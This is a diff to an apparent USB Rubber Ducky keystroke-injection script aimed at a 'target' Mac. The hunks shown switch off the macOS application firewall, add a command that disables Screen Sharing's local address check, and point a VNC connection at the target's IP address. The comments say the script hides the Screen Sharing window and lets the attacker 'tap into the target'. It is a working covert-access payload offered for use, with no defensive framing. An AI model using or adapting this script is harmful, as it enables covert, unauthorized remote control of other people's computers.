@@ -4,9 +4,11 @@ REM and control that Mac from another computer using a VNC viewer application.
 
 
 
-REM This script disables the firewall, opens a VNC connection to localhost,
+REM This script disables the firewall
+REM disable the local address check for Screen Sharing
+REM opens a VNC connection to localhost
 REM and hides the Screen Sharing window.
-REM you can replace "localhost" with targets I.P. 
+REM you MUST replace "target_ip_address" with I.P. address of targets MacOs
 
 
 REM Now you can use your local computer to tap into the target
@@ -37,8 +39,10 @@ ENTER
 DELAY 1000
 STRING /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
 ENTER
+DELAY 1000
+STRING defaults write com.apple.ScreenSharing skipLocalAddressCheck -bool true
 DELAY 500
-STRING open vnc://localhost
+STRING open vnc://target_ip_address
 DELAY 500
 ENTER
 DELAY 500
